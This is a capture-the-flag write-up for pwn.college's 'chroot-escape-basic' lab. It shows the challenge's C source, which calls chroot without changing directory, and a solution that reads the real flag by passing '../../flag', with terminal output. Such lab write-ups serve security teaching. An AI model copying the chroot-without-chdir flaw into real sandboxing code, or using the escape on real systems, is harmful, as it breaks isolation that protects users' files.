---
custom_edit_url: null
sidebar_position: 1
slug: /pwn-college/system-security/sandboxing
---

## chroot-escape-basic

```c title="/challenge/babyjail_level1.c"
#define _GNU_SOURCE 1

#include <stdlib.h>
#include <stdint.h>
#include <stdbool.h>
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <time.h>
#include <errno.h>
#include <assert.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <sys/sendfile.h>

int main(int argc, char **argv, char **envp)
{
    assert(argc > 0);

    printf("###\n");
    printf("### Welcome to %s!\n", argv[0]);
    printf("###\n");
    printf("\n");

    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 1);

    puts("This challenge will chroot into a jail in /tmp/jail-XXXXXX. You will be able to easily read a fake flag file inside this");
    puts("jail, not the real flag file outside of it. If you want the real flag, you must escape.\n");
    puts("The only thing you can do in this challenge is read out one single file, as specified by the first argument to the");
    puts("program (argv[1]).\n");

    assert(argc > 1);

    char jail_path[] = "/tmp/jail-XXXXXX";
    assert(mkdtemp(jail_path) != NULL);

    printf("Creating a jail at `%s`.\n", jail_path);

    assert(chroot(jail_path) == 0);

    int fffd = open("/flag", O_WRONLY | O_CREAT);
    write(fffd, "FLAG{FAKE}", 10);
    close(fffd);

    printf("Sending the file at `%s` to stdout.\n", argv[1]);
    sendfile(1, open(argv[1], 0), 0, 128);

}
```

Let us try passing `/flag` as the argument.

```
hacker@sandboxing~chroot-escape-basic:~$ /challenge/babyjail_level1 /flag
###
### Welcome to /challenge/babyjail_level1!
###

This challenge will chroot into a jail in /tmp/jail-XXXXXX. You will be able to easily read a fake flag file inside this
jail, not the real flag file outside of it. If you want the real flag, you must escape.

The only thing you can do in this challenge is read out one single file, as specified by the first argument to the
program (argv[1]).

Creating a jail at `/tmp/jail-kDl2Ox`.
Sending the file at `/flag` to stdout.
FLAG{FAKE}
```

So the `chroot` operation has been performed successfully.
However, notice that even though the jail has been set, the program did not change directory to / and put us in that jail.

That means we are effectively not in jail.
If we give it `/flag` as `argv[1]`, it is interpreted as `/tmp/jail/flag`, which gives us the fake flag.

In order to get the real flag, we have to pass the relative address of the real `/flag` from `/tmp/jail/`.

```
hacker@sandboxing~chroot-escape-basic:~$ /challenge/babyjail_level1 ../../flag
###
### Welcome to /challenge/babyjail_level1!
###

This challenge will chroot into a jail in /tmp/jail-XXXXXX. You will be able to easily read a fake flag file inside this
jail, not the real flag file outside of it. If you want the real flag, you must escape.

The only thing you can do in this challenge is read out one single file, as specified by the first argument to the
program (argv[1]).

Creating a jail at `/tmp/jail-DGE7N1`.
Sending the file at `../../flag` to stdout.
pwn.college{AO2x7w9KBL15qsbaBR_F1iN4tu0.0VMzIDL4ITM0EzW}
```